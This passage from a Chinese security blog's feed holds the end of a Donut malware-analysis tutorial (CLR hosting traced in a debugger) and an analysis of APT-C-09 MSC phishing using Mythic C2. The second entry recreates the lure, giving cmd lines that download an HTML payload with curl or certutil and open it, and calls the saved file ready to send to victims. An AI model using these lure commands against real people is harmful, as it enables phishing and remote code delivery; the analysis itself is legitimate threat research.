class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: clr_host.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;metahost.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;mscoree.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HRESULT hr;</span><br><span class="line">    ICLRMetaHost *pMetaHost = <span class="literal">NULL</span>;</span><br><span class="line">    ICLRRuntimeInfo *pRuntimeInfo = <span class="literal">NULL</span>;</span><br><span class="line">    ICLRRuntimeHost *pRuntimeHost = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. åˆå§‹åŒ– CLR</span></span><br><span class="line">    hr = <span class="built_in">CLRCreateInstance</span>(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&amp;pMetaHost);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CLRCreateInstance failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è·å–æœ€æ–° .NET è¿è¡Œæ—¶</span></span><br><span class="line">    hr = pMetaHost-&gt;<span class="built_in">GetRuntime</span>(<span class="string">L&quot;v4.0.30319&quot;</span>, IID_ICLRRuntimeInfo, (LPVOID*)&amp;pRuntimeInfo);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetRuntime failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">        pMetaHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å¯åŠ¨è¿è¡Œæ—¶</span></span><br><span class="line">    hr = pRuntimeInfo-&gt;<span class="built_in">GetInterface</span>(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&amp;pRuntimeHost);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetInterface failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">        pRuntimeInfo-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        pMetaHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hr = pRuntimeHost-&gt;<span class="built_in">Start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Start failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">        pRuntimeHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        pRuntimeInfo-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        pMetaHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. æ‰§è¡Œ .NET æ–¹æ³•</span></span><br><span class="line">    DWORD retVal;</span><br><span class="line">    hr = pRuntimeHost-&gt;<span class="built_in">ExecuteInDefaultAppDomain</span>(</span><br><span class="line">        <span class="string">L&quot;HelloWorld.dll&quot;</span>,  <span class="comment">// .NET DLL è·¯å¾„</span></span><br><span class="line">        <span class="string">L&quot;HelloWorld&quot;</span>,      <span class="comment">// ç±»å</span></span><br><span class="line">        <span class="string">L&quot;SayHello&quot;</span>,        <span class="comment">// é™æ€æ–¹æ³•å</span></span><br><span class="line">        <span class="string">L&quot;&quot;</span>,                <span class="comment">// å‚æ•°ï¼ˆæ— ï¼‰</span></span><br><span class="line">        &amp;retVal</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ExecuteInDefaultAppDomain failed: 0x%08X\n&quot;</span>, hr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. æ¸…ç†èµ„æº</span></span><br><span class="line">    pRuntimeHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">    pRuntimeInfo-&gt;<span class="built_in">Release</span>();</span><br><span class="line">    pMetaHost-&gt;<span class="built_in">Release</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821001611715.png" alt="image-20250821001611715"></p><p>æ ¹æ®æ–‡æ¡£ï¼ŒCLRCreateInstanceçš„å‚æ•°ä¸ºï¼š<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821005417838.png" alt="image-20250821005417838"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821010307076.png" alt="image-20250821010307076"></p><p>v3(alloced_mem_copy + 2128, alloced_mem_copy + 2144, buf) å‡½æ•°æ‰§è¡Œä¹‹åï¼Œç¬¬ä¸‰ä¸ªå‚æ•°çš„å†…å­˜åœ°å€å˜æˆäº†è¿™æ ·ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011044489.png" alt="image-20250821011044489"></p><p>åšä¸ªæ ‡è®°ï¼Œè¿™ä¸ªå°±æ˜¯æ¥å£ï¼Œè°ƒç”¨CLRCreateInstanceåˆ›å»ºäº†ICLREMetaHostæ¥å£ï¼Œå¹¶å°†å®ƒçš„æŒ‡é’ˆä¿å­˜ï¼ˆå½“å‰å‡½æ•°ä½œç”¨åŸŸå†…çš„bufï¼‰æˆ‘ä»¬å¯ä»¥é¢„æœŸè¿™ä¸ªæŒ‡é’ˆå°†ç”¨äºè°ƒç”¨ICLRMetaHostæ¥å£çš„å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011227239.png" alt="image-20250821011227239"></p><p>IDAåŠ è½½ç±»å‹ä¿¡æ¯åº“å¹¶åˆ›å»ºè‡ªå®šä¹‰ç»“æ„</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011841892.png" alt="image-20250821011841892"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011853056.png" alt="image-20250821011853056"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821011904874.png" alt="image-20250821011904874"></p><p>æ¥ä¸‹æ¥ï¼Œçœ‹èµ·æ¥å‰20ä¸ªå­—èŠ‚è¢«å¡«å……äº†ç‰ˆæœ¬å­—ç¬¦ä¸²ï¼Œä¸”è¯¥å­—ç¬¦ä¸²å·²è¢«è½¬æ¢ä¸ºå®½å­—ç¬¦å­—ç¬¦ä¸²ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821103155779.png" alt="image-20250821103155779"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821103437748.png" alt="image-20250821103437748"></p><p>æ¥ä¸‹æ¥è¿è¡Œè¿™ä¸ªå‡½æ•°çš„æ—¶å€™å‘ç°dbgæ²¡æœ‰è§£æï¼Œè¿™é‡Œè¿›è¡Œå¯¼å…¥dll</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821103715126.png" alt="image-20250821103715126"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821103618759.png" alt="image-20250821103618759"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821104342463.png" alt="image-20250821104342463"></p><p>ç°åœ¨æœ‰è¿™ä¸ªè§£æäº†</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821104405840.png" alt="image-20250821104405840"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821104557156.png" alt="image-20250821104557156"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821104611611.png" alt="image-20250821104611611"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821105016389.png" alt="image-20250821105016389"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå †æ ˆé¡¶éƒ¨çš„å…ƒç´ å¹¶éæ–‡æ¡£ä¸­å¸¸è§çš„ç‰ˆæœ¬å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æŒ‡å‘ICLRMetaHostå®ä¾‹çš„æŒ‡é’ˆã€‚è¿™æ˜¯å› ä¸ºC++ç¼–è¯‘å™¨ä¼šéšå¼åœ°å°†â€œThisâ€æŒ‡é’ˆä¼ é€’ç»™éé™æ€æˆå‘˜å‡½æ•°ã€‚è™½ç„¶è¿™ç§æ“ä½œåœ¨æºä»£ç å’ŒIDAçš„ä¼ªä»£ç è§†å›¾ä¸­ä¸å¯è§ï¼Œä½†é€šè¿‡åæ±‡ç¼–åˆ†æä»å¯è§‚å¯Ÿåˆ°ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821105353845.png" alt="image-20250821105353845"></p><p>æ¥ç€</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821110213187.png" alt="image-20250821110213187"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821110234124.png" alt="image-20250821110234124"></p><h3 id="éƒ¨åˆ†æ€»ç»“3-CLR"><a href="#éƒ¨åˆ†æ€»ç»“3-CLR" class="headerlink" title="éƒ¨åˆ†æ€»ç»“3 CLR"></a>éƒ¨åˆ†æ€»ç»“3 CLR</h3><p>æˆ‘ä»¬èŠ±äº†ç›¸å½“é•¿çš„æ—¶é—´å•æ­¥æ‰§è¡Œå‡½æ•°å¹¶æ£€æŸ¥å®ƒä»¬çš„å‚æ•°å’Œè¿”å›å€¼ã€‚è®©æˆ‘ä»¬èŠ±ç‚¹æ—¶é—´å›é¡¾å¹¶åœ¨æ­¤åˆ—å‡ºè¿™äº›å‡½æ•°ï¼š</p><ul><li>CLRCreateInstance</li><li>ICLRMetaHost::GetRuntime</li><li>CLRRuntimeInfoImpl::IsLoadable</li><li>CLRRuntimeInfoImpl::GetInterface</li><li>ICorRuntimeHost::Start</li></ul><p>æˆ‘ä»¬å€Ÿæ­¤æœºä¼šå›é¡¾å¹¶è‡ªé—®æ¶æ„è½¯ä»¶åœ¨è¿™é‡Œåœ¨åšä»€ä¹ˆã€‚æœç´¢æˆ‘ä»¬ä¸Šé¢é‡åˆ°çš„å‡½æ•°ä¼šå¾—åˆ°è®¸å¤šå…³äºä» C&#x2F;C++ ä»£ç è¿è¡Œ .NET ç¨‹åºé›†ï¼Œæˆ–åœ¨éæ‰˜ç®¡&#x2F;åŸç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ä¸­è¿è¡Œæ‰˜ç®¡å¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ç« ã€‚å›é¡¾æˆ‘ä»¬ä¹‹å‰å…³äºéæ‰˜ç®¡ä»£ç ä¸æ‰˜ç®¡ä»£ç çš„è®¨è®ºï¼Œæ‰˜ç®¡ä»£ç å¿…é¡»åœ¨ CLR ä¸­è¿è¡Œã€‚è¿™é‡Œæ¶æ„è½¯ä»¶ä¼¼ä¹åœ¨åšçš„æ˜¯ä½¿ç”¨ä¸€ç³»åˆ— API å‡½æ•°åˆ›å»ºä¸€ä¸ª CLRï¼Œå¾ˆå¯èƒ½æ˜¯ä¸ºäº†å‡†å¤‡è¿è¡Œä¹‹å‰å¤åˆ¶åˆ°å†…å­˜ä¸­çš„ PE æ–‡ä»¶ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;A-Mega-Malware-Analysis-Tutorial-Featuring-Donut&quot;&gt;&lt;a href=&quot;#A-Mega-Malware-Analysis-Tutorial-Featuring-Donut&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="æ¶æ„æ ·æœ¬åˆ†æ" scheme="https://250wuyifan.github.io/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="æ¶æ„æ ·æœ¬åˆ†æ" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>apt-c-09ï¼ˆæ‘©è¯ƒè‰ï¼‰ç»„ç»‡åŸºäºmythic C2æ¡†æ¶çš„æ–°å‹æ”»å‡»æ ·æœ¬åˆ†æ</title>
    <link href="https://250wuyifan.github.io/2025/08/18/C2%E6%A1%86%E6%9E%B6%E7%9A%84%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/08/18/C2%E6%A1%86%E6%9E%B6%E7%9A%84%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2025-08-17T16:07:16.000Z</published>
    <updated>2025-08-18T01:57:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="apt-c-09ï¼ˆæ‘©è¯ƒè‰ï¼‰ç»„ç»‡åŸºäºmythic-C2æ¡†æ¶çš„æ–°å‹æ”»å‡»æ ·æœ¬åˆ†æ"><a href="#apt-c-09ï¼ˆæ‘©è¯ƒè‰ï¼‰ç»„ç»‡åŸºäºmythic-C2æ¡†æ¶çš„æ–°å‹æ”»å‡»æ ·æœ¬åˆ†æ" class="headerlink" title="apt-c-09ï¼ˆæ‘©è¯ƒè‰ï¼‰ç»„ç»‡åŸºäºmythic C2æ¡†æ¶çš„æ–°å‹æ”»å‡»æ ·æœ¬åˆ†æ"></a>apt-c-09ï¼ˆæ‘©è¯ƒè‰ï¼‰ç»„ç»‡åŸºäºmythic C2æ¡†æ¶çš„æ–°å‹æ”»å‡»æ ·æœ¬åˆ†æ</h1><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818001253423.png" alt="image-20250818001253423"></p><p><a href="https://mp.weixin.qq.com/s/w2qLpwcx36_XiWcVzxRWuQ">https://mp.weixin.qq.com/s/w2qLpwcx36_XiWcVzxRWuQ</a></p><h2 id="æ”»å‡»æ´»åŠ¨åˆ†æ"><a href="#æ”»å‡»æ´»åŠ¨åˆ†æ" class="headerlink" title="æ”»å‡»æ´»åŠ¨åˆ†æ"></a>æ”»å‡»æ´»åŠ¨åˆ†æ</h2><p>æ‘©è¯ƒè‰ç»„ç»‡é€šè¿‡å‘é€æºå¸¦MSCæ–‡æ¡£çš„é‚®ä»¶å‘èµ·é’“é±¼æ”»å‡»ã€‚ç”¨æˆ·æ‰“å¼€MSCæ–‡æ¡£åä¼šè¿œç¨‹åŠ è½½ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å†…åµŒæ··æ·†çš„jscriptä»£ç ï¼Œjscriptè„šæœ¬æ‰§è¡Œæ—¶ä¼šä»è¿œç¨‹ä¸‹è½½è¯±é¥µæ–‡æ¡£ï¼ŒåŒæ—¶é‡Šæ”¾æ¶æ„dllï¼Œå¹¶é€šè¿‡ç™½åˆ©ç”¨çš„æ–¹å¼åŠ è½½æ¶æ„dllï¼Œç»åˆ†æè¯¥dllå±äºMythic C2æ¡†æ¶ç»„ä»¶ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå‘ç°ä¸€ä¸ªlnkæ ·æœ¬ä»ç›¸åŒè¿œç¨‹æœåŠ¡å™¨ä¸‹è½½BADNEWSæœ¨é©¬ï¼Œæ•´ä¸ªæ”»å‡»æµç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818001530204.png" alt="image-20250818001530204"></p><h2 id="MSCæ–‡æ¡£åˆ¶ä½œ"><a href="#MSCæ–‡æ¡£åˆ¶ä½œ" class="headerlink" title="MSCæ–‡æ¡£åˆ¶ä½œ"></a>MSCæ–‡æ¡£åˆ¶ä½œ</h2><h3 id="1-æ‰“å¼€mmc"><a href="#1-æ‰“å¼€mmc" class="headerlink" title="1.æ‰“å¼€mmc"></a>1.æ‰“å¼€mmc</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818002233648.png" alt="image-20250818002233648"></p><h3 id="2-åˆ¶ä½œmcn"><a href="#2-åˆ¶ä½œmcn" class="headerlink" title="2.åˆ¶ä½œmcn"></a>2.åˆ¶ä½œmcn</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818002307431.png" alt="image-20250818002307431"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818070856929.png" alt="image-20250818070856929"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818070920014.png" alt="image-20250818070920014"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818070956602.png" alt="image-20250818070956602"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤(C): cmd.exe</span><br><span class="line">å‚æ•°(P): /c curl -o <span class="number">1.</span>html <span class="string">&quot;http://localhost:8080/1.html&quot;</span> &amp;&amp; start <span class="string">&quot;&quot;</span> <span class="string">&quot;1.html&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå¯ä»¥é€‰æ‹©è‡ªå®šä¹‰å›¾æ ‡</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071040216.png" alt="image-20250818071040216"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071214968.png" alt="image-20250818071214968"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071241069.png" alt="image-20250818071241069"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071340908.png" alt="image-20250818071340908"></p><p>åœ¨è¿™é‡Œé€‰æ‹©ä¿å­˜åˆ°æœ¬åœ°å³å¯å‘ç»™åˆ«äººä½¿ç”¨äº†</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071600144.png" alt="image-20250818071600144"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818071649260.png" alt="image-20250818071649260"></p><p>æ—¢ç„¶ä¼šè‡ªåŠ¨è®©é»˜è®¤æµè§ˆå™¨æ‰“å¼€ç½‘é¡µé‚£ä¹ˆéœ€è¦å…³æ³¨è¿™ä¸ªhtmlæ€ä¹ˆè¿›è¡Œæ“ä½œå³å¯ï¼Œä¸‹å›¾æ˜¯åœ¨win732ç¯å¢ƒä¸‹æµ‹è¯•çš„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¦å°æ”¹ä¹‹å‰çš„cmdå‘½ä»¤ï¼Œå› ä¸ºæœ‰çš„è®¡ç®—æœºæ²¡æœ‰curlã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c &quot;certutil -urlcache -split -f &quot;http://192.168.239.1:8080/1.html&quot; &quot;%TEMP%\1.html&quot; &amp;&amp; start &quot;&quot; &quot;%TEMP%\1.html&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818080355326.png" alt="image-20250818080355326"></p><p>ä¸ºä»€ä¹ˆä½¿ç”¨win7å‘¢ï¼Œå› ä¸ºæ­¤ç‰ˆæœ¬é»˜è®¤æ˜¯ieæµè§ˆå™¨ï¼Œieæµè§ˆå™¨ä¸­å¯ä»¥ä½¿ç”¨ä¸€ç§activexçš„æŠ€æœ¯,è¿›è¡Œä¸€äº›æ“ä½œæ¥æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œæ¯”å¦‚æ–‡ä¸­çš„å†™ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡ï¼Œè¿˜æœ‰å¥½å¤šæ“ä½œå¯ä»¥åšï¼Œæœ‰ç‚¹ç±»ä¼¼ä¸officeç³»åˆ—çš„å®ï¼Œé‡Œé¢ä¹Ÿæœ‰ActiveXæŠ€æœ¯çš„,è¿™é‡Œå…ˆä¸åšä»‹ç»äº†ã€‚é‡ç‚¹åœ¨äºmscæ–‡ä»¶çš„åˆ¶ä½œä¸ç¤¾ä¼šå·¥ç¨‹å­¦ç»“åˆï¼Œæ›´å¥½çš„è¿›è¡Œé’“é±¼ï¼Œæˆ‘è¿™é‡Œåªåšäº†ä¸€ä¸ªå¼€å§‹ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;apt-c-09ï¼ˆæ‘©è¯ƒè‰ï¼‰ç»„ç»‡åŸºäºmythic-C2æ¡†æ¶çš„æ–°å‹æ”»å‡»æ ·æœ¬åˆ†æ&quot;&gt;&lt;a href=&quot;#apt-c-09ï¼ˆæ‘©è¯ƒè‰ï¼‰ç»„ç»‡åŸºäºmythic-C2æ¡†æ¶çš„æ–°å‹æ”»å‡»æ ·æœ¬åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;apt-c-09ï¼ˆæ‘©è¯ƒè‰ï¼‰ç»„ç»‡åŸºäºm</summary>
      
    
    
    
    <category term="æ¶æ„æ ·æœ¬åˆ†æ" scheme="https://250wuyifan.github.io/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="æ¶æ„æ ·æœ¬åˆ†æ" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
